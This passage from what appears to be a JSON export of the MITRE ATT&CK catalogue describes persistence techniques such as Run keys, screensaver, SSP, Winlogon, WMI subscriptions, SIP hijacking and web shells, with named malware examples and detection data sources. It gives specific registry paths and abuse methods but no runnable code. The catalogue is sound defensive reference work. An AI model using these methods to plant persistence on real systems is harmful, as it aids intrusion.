                    "Name": "Emissary",
                    "Description": "Variants of Emissary have added Run Registry keys to establish persistence.[31]"
                },
                {
                    "Name": "EvilGrab",
                    "Description": "EvilGrab adds a Registry Run key for ctfmon.exe to establish persistence.[20]"
                },
                {
                    "Name": "FIN10",
                    "Description": "FIN10 has established persistence by using the Registry option in PowerShell Empire to add a Run key.[32][33]"
                },
                {
                    "Name": "FIN6",
                    "Description": "FIN6 has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD.[34]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder.[35][36]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher establishes persistence by creating the Registry key HKCU\\Software\\Microsoft\\Windows\\Run.[37][38]"
                },
                {
                    "Name": "FLASHFLOOD",
                    "Description": "FLASHFLOOD achieves persistence by making an entry in the Registry's Run key.[13]"
                },
                {
                    "Name": "Gazer",
                    "Description": "Gazer can establish persistence by creating a .lnk file in the Start menu.[39][40]"
                },
                {
                    "Name": "Gold Dragon",
                    "Description": "Gold Dragon establishes persistence in the Startup folder.[41]"
                },
                {
                    "Name": "Gorgon Group",
                    "Description": "Gorgon Group malware can create a .lnk file and add a Registry Run key to establish persistence.[42]"
                },
                {
                    "Name": "Helminth",
                    "Description": "Helminth establishes persistence by creating a shortcut in the Start Menu folder.[43]"
                },
                {
                    "Name": "Hi-Zor",
                    "Description": "Hi-Zor creates a Registry Run key to establish persistence.[44]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee uses a batch file that configures the ComSysApp service to autostart in order to establish persistence.[45]"
                },
                {
                    "Name": "HTTPBrowser",
                    "Description": "HTTPBrowser has established persistence by setting the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key value for wdm to the path of the executable. It has also used the Registry entry HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn \"%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe\" to establish persistence.[46][47]"
                },
                {
                    "Name": "InnaputRAT",
                    "Description": "Some InnaputRAT variants establish persistence by modifying the Registry key HKU\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Run:%appdata%\\NeutralApp\\NeutralApp.exe.[48]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "JHUHUGIT has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.[49]"
                },
                {
                    "Name": "Kasidet",
                    "Description": "Kasidet creates a Registry Run key to establish persistence.[50][51]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar adds a sub-key under several Registry run keys.[52]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Several Ke3chang backdoors achieved persistence by adding a Run key.[53]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware attempts to maintain persistence by saving itself in the Start menu folder or by adding a Registry Run key.[54][55][56]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.[57][58]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound malware has used Registry Run keys to establish persistence.[59]"
                },
                {
                    "Name": "Matroyshka",
                    "Description": "Matroyshka can establish persistence by adding Registry Run keys.[60][61]"
                },
                {
                    "Name": "Mivast",
                    "Description": "Mivast creates the following Registry entry: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Micromedia.[62]"
                },
                {
                    "Name": "Mosquito",
                    "Description": "Mosquito establishes persistence under the Registry key HKCU\\Software\\Run auto_update.[63]"
                },
                {
                    "Name": "MuddyWater",
                    "Description": "MuddyWater has added Registry Run keys to establish persistence.[64]"
                },
                {
                    "Name": "NanHaiShu",
                    "Description": "NanHaiShu modifies the %regrun% Registry to point itself to an autostart mechanism.[65]"
                },
                {
                    "Name": "NavRAT",
                    "Description": "NavRAT creates a Registry key to ensure a file gets executed upon reboot in order to establish persistence.[66]"
                },
                {
                    "Name": "NETEAGLE",
                    "Description": "The \"SCOUT\" variant of NETEAGLE achieves persistence by adding itself to the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.[13]"
                },
                {
                    "Name": "NETWIRE",
                    "Description": "NETWIRE creates a Registry start-up entry to establish persistence.[67]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork has added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key.[68][69]"
                },
                {
                    "Name": "Pisloader",
                    "Description": "Pisloader establishes persistence via a Registry Run key.[70]"
                },
                {
                    "Name": "PLAINTEE",
                    "Description": "PLAINTEE gains persistence by adding the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce.[71]"
                },
                {
                    "Name": "PlugX",
                    "Description": "PlugX can add a Run key entry in the Registry to establish persistence.[72][20]"
                },
                {
                    "Name": "PoisonIvy",
                    "Description": "PoisonIvy creates run key Registry entries pointing to a malicious executable dropped to disk.[73]"
                },
                {
                    "Name": "PowerDuke",
                    "Description": "PowerDuke achieves persistence by using various Registry Run keys.[74]"
                },
                {
                    "Name": "POWERSOURCE",
                    "Description": "POWERSOURCE achieves persistence by setting a Registry Run key, with the path depending on whether the victim account has user or administrator access.[75]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit's New-UserPersistenceOption Persistence argument can be used to establish via the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.[76][77]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "Prikormka adds itself to a Registry Run key with the name guidVGA or guidVSA.[78]"
                },
                {
                    "Name": "Pteranodon",
                    "Description": "Pteranodon copies itself to the Startup folder to establish persistence.[79]"
                },
                {
                    "Name": "PUNCHBUGGY",
                    "Description": "PUNCHBUGGY can establish using a Registry run key.[80]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy adds itself to the startup folder or adds itself to the Registry key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.[81]"
                },
                {
                    "Name": "Putter Panda",
                    "Description": "A dropper used by Putter Panda installs itself into the ASEP Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with a value named McUpdate.[82]"
                },
                {
                    "Name": "Reaver",
                    "Description": "Reaver creates a shortcut file and saves it in a Startup folder to establish persistence.[83]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves attempts to add a shortcut file in the Startup folder to achieve persistence. If this fails, it attempts to add Registry Run keys.[20][84]"
                },
                {
                    "Name": "RogueRobin",
                    "Description": "RogueRobin created a shortcut in the Windows startup folder to launch a PowerShell script each time the user logs in to establish persistence.[85]"
                },
                {
                    "Name": "Rover",
                    "Description": "Rover persists by creating a Registry entry in HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\.[86]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM tries to add a Registry Run key under the name \"Windows Update\" to establish persistence.[87]"
                },
                {
                    "Name": "RunningRAT",
                    "Description": "RunningRAT adds itself to the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence upon reboot.[41]"
                },
                {
                    "Name": "S-Type",
                    "Description": "S-Type may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of Unique Identifier}.[88]"
                },
                {
                    "Name": "Sakula",
                    "Description": "Most Sakula samples maintain persistence by setting the Registry Run key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ in the HKLM or HKCU hive, with the Registry value and file name varying by sample.[89]"
                },
                {
                    "Name": "SeaDuke",
                    "Description": "SeaDuke is capable of persisting via the Registry Run key or a .lnk file stored in the Startup directory.[90]"
                },
                {
                    "Name": "SHIPSHAPE",
                    "Description": "SHIPSHAPE achieves persistence by creating a shortcut in the Startup folder.[13]"
                },
                {
                    "Name": "Smoke Loader",
                    "Description": "Smoke Loader adds a Registry Run key for persistence and adds a script in the Startup folder to deploy the payload.[91]"
                },
                {
                    "Name": "SNUGRIDE",
                    "Description": "SNUGRIDE establishes persistence through a Registry Run key.[92]"
                },
                {
                    "Name": "SPACESHIP",
                    "Description": "SPACESHIP achieves persistence by creating a shortcut in the current user's Startup folder.[13]"
                },
                {
                    "Name": "SslMM",
                    "Description": "To establish persistence, SslMM identifies the Start Menu Startup directory and drops a link to its own executable disguised as an \"Office Start,\" \"Yahoo Talk,\" \"MSN Gaming Z0ne,\" or \"MSN Talk\" shortcut.[93]"
                },
                {
                    "Name": "Sykipot",
                    "Description": "Sykipot has been known to establish persistence by adding programs to the Run Registry key.[94]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "A Threat Group-3390 tool can add the binary’s path to the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Run to add persistence.[95]"
                },
                {
                    "Name": "TINYTYPHON",
                    "Description": "TINYTYPHON installs itself under Registry Run key to establish persistence.[14]"
                },
                {
                    "Name": "TinyZBot",
                    "Description": "TinyZBot can create a shortcut in the Windows startup folder for persistence.[96]"
                },
                {
                    "Name": "Trojan.Karagany",
                    "Description": "Trojan.Karagany can create a link to itself in the Startup folder to automatically start itself upon system restart.[12]"
                },
                {
                    "Name": "Truvasys",
                    "Description": "Truvasys adds a Registry Run key to establish persistence.[97]"
                },
                {
                    "Name": "Turla",
                    "Description": "A Turla Javascript backdoor added a local_update_check value under the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence. Additionally, a Turla custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.[63][98]"
                },
                {
                    "Name": "TURNEDUP",
                    "Description": "TURNEDUP is capable of writing to a Registry Run key to establish.[99]"
                },
                {
                    "Name": "USBStealer",
                    "Description": "USBStealer registers itself under a Registry Run key with the name \"USB Disk Security.\"[100]"
                },
                {
                    "Name": "Vasport",
                    "Description": "Vasport copies itself to disk and creates an associated run key Registry entry to establish.[101]"
                }
            ]
        },
        "Screensaver": {
            "Name": "Screensaver",
            "Description": "Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. [1] The Windows screensaver application scrnsave.exe is located in C:\\Windows\\System32\\ along with screensavers included with base Windows installations. The following screensaver settings are stored in the Registry (HKCU\\Control Panel\\Desktop\\) and could be manipulated to achieve persistence:SCRNSAVE.exe - set to malicious PE pathScreenSaveActive - set to '1' to enable the screensaverScreenSaverIsSecure - set to '0' to not require a password to unlockScreenSaverTimeout - sets user inactivity timeout before screensaver is executedAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. [2]\n",
            "ID": "T1180",
            "Tactic": "Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, Process command-line parameters, Windows Registry, File monitoring",
            "Contributors: ": "Bartosz Jerzman",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Gazer",
                    "Description": "Gazer can establish persistence through the system screensaver by configuring it to execute the malware.[2]"
                }
            ]
        },
        "Security Support Provider": {
            "Name": "Security Support Provider",
            "Description": "Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called. [1]\n",
            "ID": "T1101",
            "Tactic": "Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator",
            "Data Sources: ": "DLL monitoring, Windows Registry, Loaded DLLs",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Mimikatz",
                    "Description": "The Mimikatz credential dumper contains an implementation of an SSP.[2]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit's Install-SSP Persistence module can be used to establish by installing a SSP DLL.[3][4]"
                }
            ]
        },
        "Service Registry Permissions Weakness": {
            "Name": "Service Registry Permissions Weakness",
            "Description": "Windows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, PowerShell, or Reg. Access to Registry keys is controlled through Access Control Lists and permissions. [1]If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).Adversaries may also alter Registry keys associated with service failure parameters (such as FailureCommand) that may be executed in an elevated context anytime the service fails or is intentionally corrupted. [2]\n",
            "ID": "T1058",
            "Tactic": "Persistence, Privilege Escalation",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Effective Permissions: ": "SYSTEM",
            "Data Sources: ": "Process command-line parameters, Services, Windows Registry",
            "CAPEC ID: ": "CAPEC-203",
            "Contributors: ": "Matthew Demaske, Adaptforward; Travis Smith, Tripwire",
            "Version": "1.0"
        },
        "Setuid and Setgid": {
            "Name": "Setuid and Setgid",
            "Description": "When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively  [1]. Normally an application is run in the current user’s context, regardless of which user or group owns the application. There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via ls -l. The chmod program can set these bits with via bitmasking, chmod 4777 [file] or via shorthand naming, chmod u+s [file].An adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user’s context. Additionally, adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future  [2].\n",
            "ID": "T1166",
            "Tactic": "Privilege Escalation, Persistence",
            "Platform: ": "Linux, macOS",
            "Permissions Required: ": "User",
            "Effective Permissions: ": "Administrator, root",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Keydnap",
                    "Description": "Keydnap adds the setuid flag to a binary so it can easily elevate in the future.[2]"
                }
            ]
        },
        "Shortcut Modification": {
            "Name": "Shortcut Modification",
            "Description": "Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use Masquerading to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.\n",
            "ID": "T1023",
            "Tactic": "Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "Contributors: ": "Travis Smith, Tripwire",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "BACKSPACE",
                    "Description": "BACKSPACE achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.[1]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "The BlackEnergy 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.[2]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie establishes persistence via a .lnk file in the victim’s startup path.[3]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 manipulated .lnk files to gather user credentials in conjunction with Forced Authentication.[4]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 created several .LNK files on the victim's machine.[5]"
                },
                {
                    "Name": "Gazer",
                    "Description": "Gazer can establish persistence by creating a .lnk file in the Start menu or by modifying existing .lnk files to execute the malware through cmd.exe.[6][7]"
                },
                {
                    "Name": "Gorgon Group",
                    "Description": "Gorgon Group malware can create a .lnk file and add a Registry Run key to establish persistence.[8]"
                },
                {
                    "Name": "Helminth",
                    "Description": "Helminth establishes persistence by creating a shortcut.[9]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar adds a .lnk file to the Windows startup folder.[10]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "A Lazarus Group malware sample adds persistence on the system by creating a shortcut in the user’s Startup folder.[11]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.[12][13]"
                },
                {
                    "Name": "Reaver",
                    "Description": "Reaver creates a shortcut file and saves it in a Startup folder to establish persistence.[14]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves attempts to add a shortcut file in the Startup folder to achieve persistence.[15][16]"
                },
                {
                    "Name": "RogueRobin",
                    "Description": "RogueRobin establishes persistence by creating a shortcut in the Windows startup folder to run a script each time the user logs in.[17]"
                },
                {
                    "Name": "S-Type",
                    "Description": "S-Type may create the file %HOMEPATH%\\Start Menu\\Programs\\Startup\\Realtek {Unique Identifier}.lnk, which points to the malicious msdtc.exe file already created in the %CommonFiles% directory.[18]"
                },
                {
                    "Name": "SeaDuke",
                    "Description": "SeaDuke is capable of persisting via a .lnk file stored in the Startup directory.[19]"
                },
                {
                    "Name": "SHIPSHAPE",
                    "Description": "SHIPSHAPE achieves persistence by creating a shortcut in the Startup folder.[1]"
                },
                {
                    "Name": "SPACESHIP",
                    "Description": "SPACESHIP achieves persistence by creating a shortcut in the current user's Startup folder.[1]"
                },
                {
                    "Name": "SslMM",
                    "Description": "To establish persistence, SslMM identifies the Start Menu Startup directory and drops a link to its own executable disguised as an \"Office Start,\" \"Yahoo Talk,\" \"MSN Gaming Z0ne,\" or \"MSN Talk\" shortcut.[20]"
                },
                {
                    "Name": "TinyZBot",
                    "Description": "TinyZBot can create a shortcut in the Windows startup folder for persistence.[21]"
                }
            ]
        },
        "SIP and Trust Provider Hijacking": {
            "Name": "SIP and Trust Provider Hijacking",
            "Description": "In user mode, Windows Authenticode [1] digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  [2] which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. [3]Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) [4] to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  [5]) and are identified by globally unique identifiers (GUIDs). [3]Similar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and whitelisting tools to classify malicious (or any) code as signed by: [3]Modifying the Dll and FuncName Registry values in HKLM\\SOFTWARE[\\WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg{SIP_GUID} that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value all files using that SIP [6] (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).Modifying the Dll and FuncName Registry values in HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData{SIP_GUID} that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP [6] (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.Modifying the DLL and Function Registry values in HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy{trust provider GUID} that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).Note: The above hijacks are also possible without modifying the Registry via DLL Search Order Hijacking.Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. [3]\n",
            "ID": "T1198",
            "Tactic": "Defense Evasion, Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "API monitoring, Application logs, DLL monitoring, Loaded DLLs, Process monitoring, Windows Registry, Windows event logs",
            "Defense Bypassed: ": "Application whitelisting, Autoruns Analysis, Digital Certificate Validation, Process whitelisting, User Mode Signature Validation",
            "Contributors: ": "Matt Graeber, @mattifestation, SpecterOps",
            "Version": "1.0"
        },
        "Startup Items": {
            "Name": "Startup Items",
            "Description": "Per Apple’s documentation, startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items [1]. This is technically a deprecated version (superseded by Launch Daemons), and thus the appropriate folder, /Library/StartupItems isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), StartupParameters.plist, reside in the top-level directory. An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism [2]. Additionally, since StartupItems run during the bootup phase of macOS, they will run as root. If an adversary is able to modify an existing Startup Item, then they will be able to Privilege Escalate as well.\n",
            "ID": "T1165",
            "Tactic": "Persistence, Privilege Escalation",
            "Platform: ": "macOS",
            "Permissions Required: ": "Administrator",
            "Effective Permissions: ": "root",
            "Data Sources: ": "File monitoring, Process monitoring",
            "Version": "1.0"
        },
        "System Firmware": {
            "Name": "System Firmware",
            "Description": "The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. [1] [2] [3]System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.\n",
            "ID": "T1019",
            "Tactic": "Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "API monitoring, BIOS, EFI",
            "CAPEC ID: ": "CAPEC-532",
            "Contributors: ": "Ryan Becwar; McAfee",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Hacking Team UEFI Rootkit",
                    "Description": "Hacking Team UEFI Rootkit is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.[4]"
                },
                {
                    "Name": "Trojan.Mebromi",
                    "Description": "Trojan.Mebromi performs BIOS modification and can download and execute a file as well as protect itself from removal.[5]"
                }
            ]
        },
        "Time Providers": {
            "Name": "Time Providers",
            "Description": "The Windows Time service (W32Time) enables time synchronization across and within domains. [1] W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients. [2]Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\. [2] The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed. [2]Adversaries may abuse this architecture to establish Persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. [3]\n",
            "ID": "T1209",
            "Tactic": "Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "API monitoring, Binary file metadata, DLL monitoring, File monitoring, Loaded DLLs, Process monitoring",
            "Contributors: ": "Scott Lundgren, @5twenty9, Carbon Black",
            "Version": "1.0"
        },
        "Web Shell": {
            "Name": "Web Shell",
            "Description": "A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). [1]Web shells may serve as Redundant Access or as a persistence mechanism in case an adversary's primary access methods are detected and removed.\n",
            "ID": "T1100",
            "Tactic": "Persistence, Privilege Escalation",
            "Platform: ": "Linux, Windows, macOS",
            "Effective Permissions: ": "SYSTEM, User",
            "Data Sources: ": "Anti-virus, Authentication logs, File monitoring, Netflow/Enclave netflow, Process monitoring",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT32",
                    "Description": "APT32 has used Web shells to maintain access to victim websites.[2]"
                },
                {
                    "Name": "ASPXSpy",
                    "Description": "ASPXSpy is a Web shell. The ASPXTool version used by Threat Group-3390 has been deployed to accessible servers running Internet Information Services (IIS).[3]"
                },
                {
                    "Name": "China Chopper",
                    "Description": "The China Chopper backdoor is a Web shell that supports server payloads for many different kinds of server-side scripting languages and contains functionality to access files, connect to a database, and open a virtual command prompt.[1]"
                },
                {
                    "Name": "Deep Panda",
                    "Description": "Deep Panda uses Web shells on publicly accessible Web servers to access victim networks.[4]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 commonly created Web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files.[5][6]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used Web shells, often to maintain access to a victim network.[7][8]"
                },
                {
                    "Name": "OwaAuth",
                    "Description": "OwaAuth is a Web shell that appears to be exclusively used by Threat Group-3390. It is installed as an ISAPI filter on Exchange servers and shares characteristics with the China Chopper Web shell.[3]"
                },
                {
                    "Name": "SEASHARPEE",
                    "Description": "SEASHARPEE is a Web shell.[8]"
                }
            ]
        },
        "Windows Management Instrumentation Event Subscription": {
            "Name": "Windows Management Instrumentation Event Subscription",
            "Description": "Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may attempt to evade detection of this technique by compiling WMI scripts. [1] Examples of events that may be subscribed to are the wall clock time or the computer's uptime. [2] Several threat groups have reportedly used this technique to maintain persistence. [3]\n",
            "ID": "T1084",
            "Tactic": "Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "WMI Objects",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "adbupd",
                    "Description": "adbupd can use a WMI script to achieve persistence.[4]"
                },
                {
                    "Name": "APT29",
                    "Description": "APT29 has used WMI event filters to establish persistence.[5]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has used WMI for persistence.[6]"
                },
                {
                    "Name": "POSHSPY",
                    "Description": "POSHSPY uses a WMI event subscription to establish persistence.[7]"
                },
                {
                    "Name": "SeaDuke",
                    "Description": "SeaDuke uses an event filter in WMI code to execute a previously dropped executable shortly after system startup.[8]"
                }
            ]
        },
        "Winlogon Helper DLL": {
            "Name": "Winlogon Helper DLL",
            "Description": "Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\\Software[Wow6432Node]Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon. [1] Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: [1]Winlogon\\Notify - points to notification package DLLs that handle Winlogon eventsWinlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs onWinlogon\\Shell - points to explorer.exe, the system shell executed when a user logs onAdversaries may take advantage of these features to repeatedly execute malicious code and establish Persistence.\n",
            "ID": "T1004",
            "Tactic": "Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "Windows Registry, File monitoring, Process monitoring",
            "CAPEC ID: ": "CAPEC-579",
            "Contributors: ": "Praetorian",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Dipsind",
                    "Description": "A Dipsind variant registers as a Winlogon Event Notify DLL to establish persistence.[2]"
                },
                {
                    "Name": "Gazer",
                    "Description": "Gazer can establish persistence by setting the value \"Shell\" with \"explorer.exe, %malware_pathfile%\" under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.[3]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla established persistence by adding a Shell value under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion]Winlogon.[4]"
                }
            ]
        },
        "Access Token Manipulation": {
            "Name": "Access Token Manipulation",
